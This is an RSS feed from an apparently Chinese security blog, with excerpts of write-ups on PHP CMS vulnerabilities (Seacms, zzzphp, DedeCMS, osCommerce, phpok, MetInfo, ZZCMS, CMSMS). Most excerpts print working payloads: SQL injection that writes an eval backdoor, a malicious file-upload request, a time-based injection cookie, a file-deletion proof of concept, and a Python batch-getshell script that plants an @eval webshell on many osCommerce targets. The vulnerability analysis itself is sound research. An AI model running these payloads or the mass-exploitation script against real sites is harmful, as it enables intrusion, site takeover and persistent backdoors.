<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>php on F0rmat&#39;Blog</title>
    <link>https://getshe11.com/tags/php/</link>
    <description>Recent content in php on F0rmat&#39;Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Fri, 27 Sep 2019 01:01:30 +0000</lastBuildDate><atom:link href="https://getshe11.com/tags/php/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Seacms&lt;=9.92前台Getshell</title>
      <link>https://getshe11.com/posts/seacms-front-desk-getshell/</link>
      <pubDate>Fri, 27 Sep 2019 01:01:30 +0000</pubDate>
      
      <guid>https://getshe11.com/posts/seacms-front-desk-getshell/</guid>
      <description>0x01 前言 好久没发代码审计的文章了，最近挺多事情的，无意中看到90Sec上面有一篇seacms前台的getshell，突然就很感兴趣，之前审计这套程序的时候也审计了一下，后面太多事情就搁置了。
0x02 漏洞复现 环境是phpstudy（最近出后门新闻最火的那个），用着也挺方便的。PHP版本是5.x的。 payload：
http://127.0.0.1/comment/api/index.php?gid=1&amp;amp;page=2&amp;amp;rlist[]=*hex/@eval($_GET[_]);?%3E 然后访问：
http://127.0.0.1/data/mysqli_error_trace.php?_=phpinfo(); 0x03 漏洞分析 关于这个SQL注入报错的地方，在之前的8.7的一篇文章里面分析过了https://getpass.cn/2019/03/04/Seacms8.7-sql-injection-analysis/
主要的地方还是在于include/sql.class.php这个文件的465-489行
它会将sql报错的信息写入了一个PHP的文件里，那我们可以就可以让sql语句报错然后将恶意语句写这个文件利用了。
0x04 结束 其实这个漏洞还挺简单的，但是在其他的版本代码是不一样的，我测试了9.2的还有之前写SQL注入的8.7版本都是不能利用的。主要代码如下： 这里是说如果我们要删除第476行的两个反斜杠，然后才可以显示报错的内容。我想是在很久之前的版本是直接写入PHP文件的，但是后面作为更新了，就加上这段代码，然后将之前的PHP存在的就删除掉。 但是这个说是9.92版本出现的就很奇怪了。em&amp;hellip;
文章测试的9.92版本程序下载地址：https://www.lanzous.com/i6eupwh</description>
    </item>
    
    <item>
      <title>某云分发APP上传漏洞</title>
      <link>https://getshe11.com/posts/an-app-distribution-system-upload-vulnerability/</link>
      <pubDate>Fri, 06 Sep 2019 10:47:03 +0000</pubDate>
      
      <guid>https://getshe11.com/posts/an-app-distribution-system-upload-vulnerability/</guid>
      <description>0x01 前言 大概有几个月没写文章了，最近都在忙(咸鱼),在某此渗透行动中发现的一个洞，感觉是开发留的一个后门。
0x02 漏洞复现 Payload：
POST /source/pack/upload/index-uplog.php HTTP/1.1 Host: 127.0.0.1 Connection: close User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZWa8hDK6XlSEJhi7 Accept: */* Accept-Language: zh-CN,zh;q=0.9 Content-Length: 322 ------WebKitFormBoundaryZWa8hDK6XlSEJhi7 Content-Disposition: form-data; name=&amp;quot;app&amp;quot;; filename=&amp;quot;Lighthouse.php&amp;quot; Content-Type: image/jpeg &amp;lt;?php phpinfo();;unlink(__FILE__);?&amp;gt; ------WebKitFormBoundaryZWa8hDK6XlSEJhi7 Content-Disposition: form-data; name=&amp;quot;time&amp;quot; test ------WebKitFormBoundaryZWa8hDK6XlSEJhi7-- 执行后会在\data\tmp下生成test.php文件
访问url:http://127.0.0.1/data/tmp/test.php
0x03 漏洞分析 漏洞文件位置:source/pack/upload/index-uplog.php
&amp;lt;?php if(!empty($_FILES)){ $filepart = pathinfo($_FILES[&amp;#39;app&amp;#39;][&amp;#39;name&amp;#39;]); $extension = strtolower($filepart[&amp;#39;extension&amp;#39;]); if(in_array($extension,array(&amp;#39;ipa&amp;#39;,&amp;#39;apk&amp;#39;,base64_decode(&amp;#39;cGhw&amp;#39;)))){ $time = $_POST[&amp;#39;time&amp;#39;]; $dir = &amp;#39;../../../data/tmp/&amp;#39;.$time.&amp;#39;/&amp;#39;; if(!</description>
    </item>
    
    <item>
      <title>浅析PHP反序列化漏洞</title>
      <link>https://getshe11.com/posts/analysis-of-php-deserialization-vulnerabilities/</link>
      <pubDate>Wed, 05 Jun 2019 17:00:57 +0000</pubDate>
      
      <guid>https://getshe11.com/posts/analysis-of-php-deserialization-vulnerabilities/</guid>
      <description>0x01 前言 很久没有些文章了，今天复习了反序列化漏洞的知识，顺便写了一篇文章。
0x02 PHP序列化和反序列化基础 我们想要将数组值存储到数据库时，就可以对数组进行序列化操作，然后将序列化后的值存储到数据库中。其实PHP序列化数组就是将复杂的数组数据类型转换为字符串，方便数组存库操作。对PHP数组进行序列化和反序列化操作，主要就用到两个函数，serialize和unserialize。
PHP序列化：serialize 在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。
序列化函数原型如下：
string serialize ( mixed $value ) 先看个例子
&amp;lt;? php class TEST { public $data; private $pass; public function __construct($data, $pass) { $this-&amp;gt;data = $data; $this-&amp;gt;pass = $pass; } } $number = 34; $str = &amp;#39;user&amp;#39;; $bool = true; $null = NULL; $arr = array(&amp;#39;a&amp;#39; =&amp;gt; 10, &amp;#39;b&amp;#39; =&amp;gt; 200); $test = new TEST(&amp;#39;uu&amp;#39;, true); var_dump(serialize($number)); var_dump(serialize($str)); var_dump(serialize($bool)); var_dump(serialize($null)); var_dump(serialize($arr)); var_dump(serialize($test)); ?</description>
    </item>
    
    <item>
      <title>zzzphp1.61 代码审计-从SQL注入到Getshell</title>
      <link>https://getshe11.com/posts/zzzphp1.61-code-auditing-from-injecting-to-taking-a-shell/</link>
      <pubDate>Sun, 10 Mar 2019 17:56:36 +0000</pubDate>
      
      <guid>https://getshe11.com/posts/zzzphp1.61-code-auditing-from-injecting-to-taking-a-shell/</guid>
      <description>0x01 前言 前天看到zzzphp这一个cms，看着有点像zzzcms，去看了也是zzzcms开发的一套程序，于是就去审计一下，这zzzcms我之前也有审计过 https://bbs.ichunqiu.com/thread-14684-1-1.html https://getpass.cn/zzcms-Any-user-password-changes-loopholes-code-points/ https://getpass.cn/ZZCMS8.2-any-file-deleted-to-getshell/ 这套程序漏洞确实比较多，后面也做了很多改善。 那天看了表哥写的一篇PHPCMS的代码审计文章，深有感悟，授人以鱼不如授人以渔，确实是，写那么多审计文章，从审计代码的开始到结束，这种文章少之甚少。我也希望我以后写的文章也带上这种方式。 这套审计的漏洞比较多，SQL注入漏洞、任意文件删除漏洞、任意文件读取漏洞、远程执行漏洞，当中也借助了漏扫工具。废话不多说，直接开始吧。 文章也是原来的方式，先复现后分析。
0x02 SQL注入漏洞（ 获取管理员密码） 漏洞复现 payload:
GET /search/ HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=58ebb86ae371bd1f65466b1b94f7a5f7; zzz_adminpass=1;zzz_keys=0&#39;XOR(if(now()=sysdate(),sleep(10),0))XOR&#39;Z Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 对比两次的时间就晓得我们的语句执行成功了，表示存在SQL注入漏洞。 漏洞分析 这个洞是先用AWVS工具扫了一遍出来的，我们审计一套代码的时候可以先试试这些漏扫工具，提高一下效率。虽然有误报但是收集到的信息比手工去检测的效率高。
大家测试的时候可以用PHPstorm或者vscode这些工具去调试，走一遍整个过程，这样会对程序有所了解。
再发一次包到search页面会停留到search/index.php文件，这个文件比较简单，包含了一个zzz_client.php的文件。
&amp;lt;?php define(&amp;#39;LOCATION&amp;#39;, &amp;#39;search&amp;#39;); require dirname(dirname(__FILE__)). &amp;#39;/inc/zzz_client.php&amp;#39;; 进到inc/zzz_client.php文件有一些包含的进来的文件类似模板的文件等，这里通过上面的LOCATION找到$tplfile= TPL_DIR . &#39;search.html&#39;; 
switch ($location) { case &amp;#39;about&amp;#39;: $tplfile= TPL_DIR .</description>
    </item>
    
    <item>
      <title>Seacms 8.7版本SQL注入分析</title>
      <link>https://getshe11.com/posts/seacms8.7-sql-injection-analysis/</link>
      <pubDate>Mon, 04 Mar 2019 15:49:11 +0000</pubDate>
      
      <guid>https://getshe11.com/posts/seacms8.7-sql-injection-analysis/</guid>
      <description>0x01 前言 好像没发文章了，在t00ls看到一篇seacms8.7的分析文，不过不是最新的版本，好久没看到seacms和maccms这两个cms发新的漏洞了，那个过滤有点恶心。后来还在nosec看到一篇离新版9.0比较近的一个版本8.9的一个变量覆盖到sql注入文章，但是我复现不成功，我拿的是6.53的版本，原因后面会讲到。
0x02 环境 Web： phpstudy and MAMP System： Windows 7 X64 and MacOS Browser： Firefox Quantum and Chrome MySQL： 5.5 php： 5.4
0x03 漏洞详情 漏洞复现 payload:
http://10.211.55.4/upload/comment/api/index.php?gid=1&amp;amp;page=2&amp;amp;rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(password)from%20sea_admin))),@`%27` 漏洞分析 在此之前我在MySQL 5.6、5.7上面复现都不成功，因为这两个版本用extractvalue()、updatexml()报错注入不成功，后来换了系统Linux和Windows还有macOS来测试也是一样，和PHP、Apache的版本没有影响只要的还是MySQL的版本问题，所以大家测试的时候注意一下版本。
漏洞文件是在：comment/api/index.php
&amp;lt;?php session_start(); require_once(&amp;#34;../../include/common.php&amp;#34;); $id = (isset($gid) &amp;amp;&amp;amp; is_numeric($gid)) ? $gid : 0; $page = (isset($page) &amp;amp;&amp;amp; is_numeric($page)) ? $page : 1; $type = (isset($type) &amp;amp;&amp;amp; is_numeric($type)) ? $type : 1; $pCount = 0; $jsoncachefile = sea_DATA.&amp;#34;/cache/review/$type/$id.js&amp;#34;; //缓存第一页的评论 if($page&amp;lt;2) { if(file_exists($jsoncachefile)) { $json=LoadFile($jsoncachefile); die($json); } } $h = ReadData($id,$page); $rlist = array(); if($page&amp;lt;2) { createTextFile($h,$jsoncachefile); } die($h);	function ReadData($id,$page) { global $type,$pCount,$rlist; $ret = array(&amp;#34;&amp;#34;,&amp;#34;&amp;#34;,$page,0,10,$type,$id); if($id&amp;gt;0) { $ret[0] = Readmlist($id,$page,$ret[4]); $ret[3] = $pCount; $x = implode(&amp;#39;,&amp;#39;,$rlist); if(!</description>
    </item>
    
    <item>
      <title>CVE-2018-1000094-CMSMS 2.2.5代码执行漏洞(每周一洞)</title>
      <link>https://getshe11.com/posts/cve-2018-1000094-cmsms-2.2.5-code-execution-vulnerability/</link>
      <pubDate>Sat, 11 Aug 2018 09:31:30 +0000</pubDate>
      
      <guid>https://getshe11.com/posts/cve-2018-1000094-cmsms-2.2.5-code-execution-vulnerability/</guid>
      <description>0x01 前言 CMS Made Simple是一个简单易于使用的内容管理系统。它使用PHP，MySQL和Smarty模板引擎开发。
昨天看漏洞库的时候看到这一款CMS，漏洞操作也挺简单的，但是可以申请CVE，于是乎就复现了一篇过程和写漏洞脚本。
0x02 环境  下载下来是一个安装文件cmsms-2.2.5-install.php，浏览器直接打开  默认Next，到数据库连接这一块要先创建一个数据库，我这里创建一个名为simple的数据库，然后填上数据库连接信息  填写管理账号密码信息  填写可写可读的目录和选择语言  安装完成，除了邮件模块，不过也用不上。   0x03 漏洞复现过程  登录后台   选择File Manager   编写一个文件名为a.txt内容为&amp;lt;?php phpinfo();?&amp;gt;的文件，然后点击上传。   选中a.txt，点击copy,名字改为rce.php,然后确定   文件就copy过来了，有点类似系统的copy命令。   访问rce.php   0x04 漏洞分析过程  还记得上一篇的phpok的分析，如果找不出关键文件，可以抓包分析。 可以看到主要是通过文件admin/moduleinterface.php文件进行操作的。 可能这样看会让人很乱，我们可以用phpstorm的debug来调试整个过程 相关配置可以看https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm+xdebug/ 从上面的抓包可以看出来，mact参数是FileManager，m1_是fileaction，大家可以去这里下断点然后一步一步分析整个流程。  有经验可以看出来，FileManager就是modules\FileManager目录，fileaction就是modules/FileManager/action.fileaction.php文件，再往下看代码的68行，可以看到我们的copy操作的代码。  if (isset($params[&amp;#34;fileactioncopy&amp;#34;]) || $fileaction==&amp;#34;copy&amp;#34;) { include_once(__DIR__.&amp;#34;/action.copy.php&amp;#34;); return; }  我们找到这个文件action.copy.php，我们在93行下一个断点，然后去操作copy，可以看到有各种很详细的参数信息。  我们F7单步走，可以看到执行$res = copy($src,$dest);的时候没有发生错误。  这样就正式完成了所有操作，如有不懂可以看下官方文档的copy函数的用法http://www.php.net/manual/en/function.copy.php  0x05 漏洞脚本 python版本 # Exploit Title: CMS Made Simple 2.</description>
    </item>
    
    <item>
      <title>phpok4.9后台getshell(每周一洞)</title>
      <link>https://getshe11.com/posts/phpok4.9-background-getshell/</link>
      <pubDate>Mon, 06 Aug 2018 08:19:40 +0000</pubDate>
      
      <guid>https://getshe11.com/posts/phpok4.9-background-getshell/</guid>
      <description>0x01 前言 昨天看到phpok可以申请cve就去审计了一下，存在漏洞的地方还是挺多的，时间不多找了个简单的任意文件上传漏洞。
0x02 环境  程序下载：https://www.lanzous.com/i1ksjkd 集成环境是PHPstudy,PHP5.6。 安装程序   4. 先创建一个数据库phpok 5. 设置管理员账号密码 6. 安装成功 0x03 漏洞挖掘过程   打开打开FolderChangesView记录程序的文件变动。   登录后台 程序升级-&amp;gt;压缩包升级   编辑一个测试文件phpinfo.php,压缩为phpinfo.zip上传。   点击上传，压缩包里面的文件会被压缩到网站根目录   访问根目录下新生成的文件   0x04 漏洞分析 漏洞代码出现在framework/admin/update_control.php文件的unzip_f函数,可以看到用到lib里面的phpzip类，有兴趣可以去读下源码framework/libs/phpzip.php 大家可能疑问你怎么知道漏洞文件是这个，可以抓包来查看整过利用的过程，然后再去源码分析。 public function unzip_f() { $zipfile = $this-&amp;gt;get(&amp;#39;zipfile&amp;#39;); if(!$zipfile){ $this-&amp;gt;error(P_Lang(&amp;#39;未指定附件文件&amp;#39;)); } if(strpos($zipfile,&amp;#39;..&amp;#39;) !== false){ $this-&amp;gt;error(P_Lang(&amp;#39;不支持带..上级路径&amp;#39;)); } if(!file_exists($this-&amp;gt;dir_root.$zipfile)){ $this-&amp;gt;error(P_Lang(&amp;#39;ZIP文件不存在&amp;#39;)); } $this-&amp;gt;lib(&amp;#39;phpzip&amp;#39;)-&amp;gt;unzip($this-&amp;gt;dir_root.$zipfile,&amp;#39;data/update/&amp;#39;); $info = $this-&amp;gt;update_load(); if(!$info || (is_array($info) &amp;amp;&amp;amp; $info[&amp;#39;status&amp;#39;] == &amp;#39;error&amp;#39;)){ $this-&amp;gt;error($info[&amp;#39;content&amp;#39;]); } $this-&amp;gt;success(); } 可以看到用到lib里面的phpzip类，有兴趣可以去读下源码framework/libs/phpzip.</description>
    </item>
    
    <item>
      <title>phpok 4.9代码审计(每周一洞)</title>
      <link>https://getshe11.com/posts/phpok-4.9-code-audit/</link>
      <pubDate>Sun, 05 Aug 2018 14:54:07 +0000</pubDate>
      
      <guid>https://getshe11.com/posts/phpok-4.9-code-audit/</guid>
      <description>0x01 前言 一放暑假就特别多事情，很多事情都耽误了，看吐司文章看到一篇不错的审计文章，就学习下。
0x02 环境搭建 环境没什么要求PHPstudy就能搞定，这个要先创建数据库再安装程序的。
0x03 任意文件上传漏洞 漏洞复现  登录后台，点击模块管理   新建一个测试文件然后压缩  然后导入模块 可以看到已经上传到了/data/cache/的目录下面了：  访问文件   漏洞分析 漏洞代码在framework/admin/modulec_control.php 642行。 大家可以详细的分析这个流程，主要漏洞的代码是 $this-&amp;gt;lib(&#39;phpzip&#39;)-&amp;gt;unzip($this-&amp;gt;dir_root.$zipfile,$this-&amp;gt;dir_root.&#39;data/cache/&#39;); 没有做任何的过滤，直接把zip原样解压缩到/data/cache/的目录下面。
/** * 模块导入 * @变量 zipfile 指定的ZIP文件地址 **/ public function import_f() { $zipfile = $this-&amp;gt;get(&amp;#39;zipfile&amp;#39;); if(!$zipfile){ $this-&amp;gt;lib(&amp;#39;form&amp;#39;)-&amp;gt;cssjs(array(&amp;#39;form_type&amp;#39;=&amp;gt;&amp;#39;upload&amp;#39;)); $this-&amp;gt;addjs(&amp;#39;js/webuploader/admin.upload.js&amp;#39;); $this-&amp;gt;view(&amp;#39;module_import&amp;#39;); } if(strpos($zipfile,&amp;#39;..&amp;#39;) !== false){ $this-&amp;gt;error(P_Lang(&amp;#39;不支持带..上级路径&amp;#39;)); } if(!file_exists($this-&amp;gt;dir_root.$zipfile)){ $this-&amp;gt;error(P_Lang(&amp;#39;ZIP文件不存在&amp;#39;)); } $this-&amp;gt;lib(&amp;#39;phpzip&amp;#39;)-&amp;gt;unzip($this-&amp;gt;dir_root.$zipfile,$this-&amp;gt;dir_root.&amp;#39;data/cache/&amp;#39;); if(!file_exists($this-&amp;gt;dir_root.&amp;#39;data/cache/module.xml&amp;#39;)){ $this-&amp;gt;error(P_Lang(&amp;#39;导入模块失败，请检查解压缩是否成功&amp;#39;)); } $rs = $info = $this-&amp;gt;lib(&amp;#39;xml&amp;#39;)-&amp;gt;read($this-&amp;gt;dir_root.&amp;#39;data/cache/module.xml&amp;#39;,true); if(!$rs){ $this-&amp;gt;error(P_Lang(&amp;#39;XML内容解析异常&amp;#39;)); } $tmp = $rs; if(isset($tmp[&amp;#39;_fields&amp;#39;])){ unset($tmp[&amp;#39;_fields&amp;#39;]); } $insert_id = $this-&amp;gt;model(&amp;#39;module&amp;#39;)-&amp;gt;save($tmp); if(!</description>
    </item>
    
    <item>
      <title>osCommerce 2.3.4.1 - 远程代码执行漏洞（每日一洞）</title>
      <link>https://getshe11.com/posts/oscommerce-2.3.4.1-remote-code-execution-vulnerability/</link>
      <pubDate>Mon, 02 Apr 2018 11:18:58 +0000</pubDate>
      
      <guid>https://getshe11.com/posts/oscommerce-2.3.4.1-remote-code-execution-vulnerability/</guid>
      <description>0x01 前言 好几天没有写了，前两天又去Boom了，差点没缓过来。今天在exploit-db逛看到一个洞，也是install的地方，想去利用上次那个远程数据库技巧来尝试下，发现这个洞根本用不到，不过新手可以学习下哈，也可以收藏下，因为有时候在ctf线下赛的时候官方会拿一些国外的程序给你玩，最近也在写python的漏洞利用工具，欢迎关注我的github。
0x02 环境 程序源码下载：https://www.exploit-db.com/apps/ce2796b352d6e0fb4e9f03866ae98541-oscommerce-2.3.4.zip Web环境:Windows 10+Apache2+PHP5.6+MySQL
0x03 漏洞利用过程 1.我们先正常安装这个程序 2.执行我们的payload GET:http://127.0.0.1/oscommerce/install/install.php?step=4 POST:DIR_FS_DOCUMENT_ROOT=./&amp;amp;DB_DATABASE=&#39;);phpinfo();/* 3.访问写入代码的文件 GET:http://127.0.0.1/oscommerce/install/includes/configure.php  写入的内容： 0x04 漏洞代码分析过程 漏洞文件出现的位置是：\install\templates\pages\install_4.php
说起这个国外写的程序还没我们国内的严谨，安装完没有写入install.lock或者像Joomla（最近正在写）一样强制让客户删除安装文件。
直接看代码吧，过程也不算太复杂。这里用到了PHP以下的函数$HTTP_POST_VARS这个函数类似与PHP4及以上的$_POST。这里是接收参数的地方。 最重要还是这里，因为如果没有传入DIR_FS_DOCUMENT_ROOT的话下面写入文件就无法进行了。
0x05 Payload构造 DIR_FS_DOCUMENT_ROOT是必须的了，让它等于根目录./就行了。 写入恶意代码就用DB_DATABASE吧，我们先用闭合&#39;);前面，然后再写入phpinfo();,后面它会自动加上&#39;);，exploit-db上面是直接加上/*注释掉的，因为这个程序很奇怪，先一遍在install的配置文件，然后再写到程序里面的配置文件，所以就不会顾虑网站会崩的问题了。 payload： post 模式DIR_FS_DOCUMENT_ROOT=./&amp;amp;DB_DATABASE=&#39;);phpinfo();/*
0x06 用Python编写批量getshell脚本 我觉得你们应该读得懂这个代码吧，如果有需要的话我以后会把这里面的流程解释一遍。
#!/usr/bin/env #author:F0rmat import sys import requests import threading def exploit(target): if sys.argv[1]== &amp;#34;-f&amp;#34;: target=target[0] url1=target+&amp;#34;/install/install.php?step=4&amp;#34; data={ &amp;#39;DIR_FS_DOCUMENT_ROOT&amp;#39;: &amp;#39;./&amp;#39;, &amp;#39;DB_DATABASE&amp;#39;:&amp;#34;\&amp;#39;);@eval($_POST[&amp;#39;f0rmat&amp;#39;]);echo &amp;#39;F0rmat&amp;#39;;/*&amp;#34; } url2=target+&amp;#34;install/includes/configure.php&amp;#34; try: requests.post(url1,data=data) verify = requests.get(url2, timeout=3) if &amp;#34;F0rmat&amp;#34; in verify.content: print &amp;#39;Write success,shell url:&amp;#39;,url2,&amp;#39;pass:f0rmat&amp;#39; with open(&amp;#34;success.</description>
    </item>
    
    <item>
      <title>DedeCMS V5.7 SP2后台Getshell 代码执行漏洞(每日一洞)</title>
      <link>https://getshe11.com/posts/dedecms-v5.7-sp2-background-getshell-code-execution-vulnerability/</link>
      <pubDate>Sat, 10 Mar 2018 00:11:57 +0000</pubDate>
      
      <guid>https://getshe11.com/posts/dedecms-v5.7-sp2-background-getshell-code-execution-vulnerability/</guid>
      <description>前言 这两天费劲脑力去撩小姐姐，感觉好难啊，还不如审计代码。  环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7 Tools： PhpStorm 2017.1.1
复现 漏洞利用  首先访问域名 + /dede/tpl.php?action=upload，在这个页面的源代码中获取到token值。  访问以下地址： 域名 + /dede/tpl.php?filename=shell.lib.php&amp;amp;action=savetagfile&amp;amp;content=&amp;lt;?php%20phpinfo();?&amp;gt;&amp;amp;token=刚才的token值  访问shell的地址：  域名 + /include/taglib/shell.lib.php
漏洞分析 代码位置和代码 位置： dedecms\dede\tpl.php 代码：
if(empty($filename)) $filename = &amp;#39;&amp;#39;; $filename = preg_replace(&amp;#34;#[\/\\\\]#&amp;#34;, &amp;#39;&amp;#39;, $filename); 中间省略。。。。。。。。。 else if($action==&amp;#39;savetagfile&amp;#39;) { csrf_check(); if(!preg_match(&amp;#34;#^[a-z0-9_-]{1,}\.lib\.php$#i&amp;#34;, $filename)) { ShowMsg(&amp;#39;文件名不合法，不允许进行操作！&amp;#39;, &amp;#39;-1&amp;#39;); exit(); } require_once(DEDEINC.&amp;#39;/oxwindow.class.php&amp;#39;); $tagname = preg_replace(&amp;#34;#\.lib\.php$#i&amp;#34;, &amp;#34;&amp;#34;, $filename); $content = stripslashes($content); $truefile = DEDEINC.</description>
    </item>
    
    <item>
      <title>MetInfo5.3.19安装过程过滤不严导致Getshell(每日一洞)</title>
      <link>https://getshe11.com/posts/metinfo5.3.19-installation-process-is-not-strict-lead-to-getshell/</link>
      <pubDate>Tue, 06 Mar 2018 22:41:35 +0000</pubDate>
      
      <guid>https://getshe11.com/posts/metinfo5.3.19-installation-process-is-not-strict-lead-to-getshell/</guid>
      <description>前言 前几天在先知看到的漏洞，就很想写个分析过程了的，因为比赛培训和在审计一个CMS拖到了今天。
环境 Web： phpstudy System： Windows 7 X64 Browser： Firefox Quantum Python version ： 2.7 Tools： PhpStorm 2017.3.3、Seay源代码审计系统
任意文件删除漏洞 复现 POC 前提：需要由对应的删除权限 flienamecsv代表要删除的文件
http://xxx.com/admin/app/batch/csvup.php?fileField=1&amp;amp;flienamecsv=../../../config/install.lock
执行结果 代码位置和漏洞代码 代码位置 \admin\app\batch\csvup.php
漏洞代码 &amp;lt;?php $depth=&amp;#39;../&amp;#39;; require_once $depth.&amp;#39;../login/login_check.php&amp;#39;; setlocale(LC_ALL,array(&amp;#39;zh_CN.gbk&amp;#39;,&amp;#39;zh_CN.gb2312&amp;#39;,&amp;#39;zh_CN.gb18030&amp;#39;)); $codeold=&amp;#39;gbk&amp;#39;; $codenew=&amp;#39;utf-8&amp;#39;; $classflie=explode(&amp;#39;_&amp;#39;,$fileField); $classflie=explode(&amp;#39;-&amp;#39;,$classflie[count($classflie)-1]); $class1=$classflie[0]; $class2=$classflie[1]; $class3=$classflie[2]; $class=$class3?$class3:($class2?$class2:$class1); $classcsv=$db-&amp;gt;get_one(&amp;#34;select * from $met_columnwhere id=$class&amp;#34;); if(!$classcsv){ metsave(&amp;#34;../app/batch/contentup.php?anyid=$anyid&amp;amp;lang=$lang&amp;#34;,$lang_csvnocolumn,$depth); } $table=moduledb($classcsv[&amp;#39;module&amp;#39;]); $file = fopen($flienamecsv,&amp;#39;r&amp;#39;); $fdata=fgetcsv($file); foreach($fdata as $key=&amp;gt;$val){ if(iconv($codeold,$codenew,$val)==$lang_columnhtmlname){$staticnum=$key;} } $numcsv=0; while ($data = fgetcsv($file)){ $staticone=iconv($codeold,$codenew,$data[$staticnum]); if($staticone!=NULL){ $static[$numcsv+1]=$staticone; $static_copy[]=$staticone; } $dataqrray[]=$data; $numcsv++; } fclose($file); @file_unlink($flienamecsv); 分析过程  开始的时候我就在找$fileField和$flienamecsv这两个变量是怎么get过来的，分析了包含include/common.</description>
    </item>
    
    <item>
      <title>ZZCMS8.2任意文件删除至getshell(每日一洞)</title>
      <link>https://getshe11.com/posts/zzcms8.2-any-file-deleted-to-getshell/</link>
      <pubDate>Tue, 06 Mar 2018 22:41:35 +0000</pubDate>
      
      <guid>https://getshe11.com/posts/zzcms8.2-any-file-deleted-to-getshell/</guid>
      <description>前言 今天就审计一个洞，时间不够用了。明天或者周末看看有空有拿一些难的漏洞来审计复现一下。
环境 Web： Apache+PHP+MySql System： Ubuntu Browser： Firefox Quantum
漏洞详情 任意文件删除 文件位置：/user/licence_save.php
代码：
$title=trim($_POST[&amp;#34;title&amp;#34;]);	$img=trim($_POST[&amp;#34;img&amp;#34;]); if ($_GET[&amp;#34;action&amp;#34;]==&amp;#34;add&amp;#34;){ query(&amp;#34;Insert into zzcms_licence(title,img,editor,sendtime) values(&amp;#39;$title&amp;#39;,&amp;#39;$img&amp;#39;,&amp;#39;$username&amp;#39;,&amp;#39;&amp;#34;.date(&amp;#39;Y-m-d H:i:s&amp;#39;).&amp;#34;&amp;#39;)&amp;#34;) ; }elseif ($_GET[&amp;#34;action&amp;#34;]==&amp;#34;modify&amp;#34;){ $oldimg=trim($_POST[&amp;#34;oldimg&amp;#34;]); $id=$_POST[&amp;#34;id&amp;#34;]; if ($id==&amp;#34;&amp;#34; || is_numeric($id)==false){ $FoundErr=1; $ErrMsg=&amp;#34;&amp;lt;li&amp;gt;&amp;#34;. $f_array[0].&amp;#34;&amp;lt;/li&amp;gt;&amp;#34;; WriteErrMsg($ErrMsg); }else{ query(&amp;#34;update zzcms_licence set title=&amp;#39;$title&amp;#39;,img=&amp;#39;$img&amp;#39;,sendtime=&amp;#39;&amp;#34;.date(&amp;#39;Y-m-d H:i:s&amp;#39;).&amp;#34;&amp;#39;,passed=0 where id=&amp;#39;$id&amp;#39;&amp;#34;); if ($oldimg&amp;lt;&amp;gt;$img &amp;amp;&amp;amp; $oldimg&amp;lt;&amp;gt;&amp;#34;/image/nopic.gif&amp;#34;){ $f=&amp;#34;../&amp;#34;.$oldimg; if (file_exists($f)){ unlink($f); } $fs=&amp;#34;../&amp;#34;.str_replace(&amp;#34;.&amp;#34;,&amp;#34;_small.&amp;#34;,$oldimg).&amp;#34;&amp;#34;; if (file_exists($fs)){ unlink($fs);	} }	} }  我们可以看到如果从$_GET传值过来如果是modify，那么就执行下面的内容。 $oldimg=trim($_POST[&amp;quot;oldimg&amp;quot;]);把$_POST过来的oldimg用trim去点两边的空格之后赋值给$oldimg 接下来这些不用理会，直到if ($oldimg&amp;lt;&amp;gt;$img &amp;amp;&amp;amp; $oldimg&amp;lt;&amp;gt;&amp;quot;/image/nopic.gif&amp;quot;)这句判断，$img是上面$_POST过来的，填其他值就不等于了，然后我们的文件名也不会等于/image/nopic.gif $f=&amp;quot;../&amp;quot;.$oldimg;跳到主目录然后接上我们的要传过来的文件路径和文件名 if (file_exists($f)){unlink($f);}这句file_exists判断文件是否存在，存在就用unlink删除文件。 中间没有做任何的过滤。。。  构造POC 我们要把这些$_POST和$_GET的值都加上，要不然PHP会报错不执行下去。</description>
    </item>
    
    <item>
      <title>ZZCMS8.2任意用户密码修改漏洞代码分析(每日一洞)</title>
      <link>https://getshe11.com/posts/zzcms-any-user-password-changes-loopholes-code-points/</link>
      <pubDate>Tue, 06 Mar 2018 00:03:07 +0000</pubDate>
      
      <guid>https://getshe11.com/posts/zzcms-any-user-password-changes-loopholes-code-points/</guid>
      <description>前言 这几天感冒很难受，再加上比赛的培训，估计后面会两天一篇。 这个小型CMS前段时间我也挖到了很多洞，这次就找seebug发的一篇来做审计。
环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7
漏洞详情 代码位置和代码  位置 \one\getpassword.php 代码  &amp;lt;?php if(!isset($_SESSION)){session_start();} include(&amp;#34;../inc/conn.php&amp;#34;); include(&amp;#34;../inc/top2.php&amp;#34;); include(&amp;#34;../inc/bottom.php&amp;#34;); $action = isset($_POST[&amp;#39;action&amp;#39;])?$_POST[&amp;#39;action&amp;#39;]:&amp;#34;&amp;#34;; $file=&amp;#34;../template/&amp;#34;.$siteskin.&amp;#34;/getpassword.htm&amp;#34;; if (file_exists($file)==false){ WriteErrMsg($file.&amp;#39;模板文件不存在&amp;#39;); exit; } $fso = fopen($file,&amp;#39;r&amp;#39;); $strout = fread($fso,filesize($file)); $stepall=strbetween($strout,&amp;#34;{step1}&amp;#34;,&amp;#34;{/step4}&amp;#34;); $step1=strbetween($strout,&amp;#34;{step1}&amp;#34;,&amp;#34;{/step1}&amp;#34;); $step2=strbetween($strout,&amp;#34;{step2}&amp;#34;,&amp;#34;{/step2}&amp;#34;); 